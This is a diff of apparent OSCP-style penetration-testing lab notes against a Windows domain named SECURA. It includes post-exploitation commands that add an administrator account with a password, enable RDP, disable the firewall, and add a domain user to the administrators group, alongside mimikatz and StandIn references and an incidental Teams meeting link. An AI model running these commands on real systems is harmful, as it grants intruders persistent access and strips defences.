@@ -33,11 +33,12 @@ C:\Program Files\ManageEngine\AppManager14\working\mimikatz-master\x64>mimikatz.
 ┌──(kali㉿kali)-[~/lab0/96]
 └─$ mysql -h 192.168.218.96 -u root -p
 
-powershell/lab0/95
+powershell/lab0/95 //firewall close
 C:\Program Files\ManageEngine\AppManager14\working> net user aries Oscp#1234 /add
 C:\Program Files\ManageEngine\AppManager14\working> net localgroup administrators aries /add
 C:\Program Files\ManageEngine\AppManager14\working> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 C:\Program Files\ManageEngine\AppManager14\working> netsh advfirewall set allprofiles state off
+C:\Program Files\ManageEngine\AppManager14\working> net localgroup administrators "SECURA\charlotte" /add
 
 ┌──(kali㉿kali)-[~]
 └─$ xfreerdp -v:192.168.218.95 -u:aries -p:'Oscp#1234' +clipboard -cert:ignore -drive:aries,/home/kali/lab0/95
@@ -86,8 +87,7 @@ Target node: DEFAULT DOMAIN POLICY@SECURA.YZX
 └─$ wget https://github.com/FuzzySecurity/StandIn/releases/download/v1.3/StandIn_v13_Net35_45.zip
 unzip StandIn_v13_Net35_45.zip
 
-https://teams.microsoft.com/l/meetup-join/19%3ameeting_MTVkODIwMjItOTZiMy00OWUwLThlZTYtM2NkNGQzMjA5Y2My%40thread.v2/0?context=%7b%22Tid%22%3a%22513294a0-3e20-41b2-a970-6d30bf1546fa%22%2c%22Oid%22%3a%22031e8033-4604-4cf6-a162-73be85389a62%22%7d
-
+https://teams.microsoft.com/l/meetup-join/19%3ameeting_ZTQ0NDUwMjUtYzRjZi00NTA3LThjNTEtNjVhNjBmMWQyNzJi%40thread.v2/0?context=%7b%22Tid%22%3a%22513294a0-3e20-41b2-a970-6d30bf1546fa%22%2c%22Oid%22%3a%22031e8033-4604-4cf6-a162-73be85389a62%22%7d
 
 
 
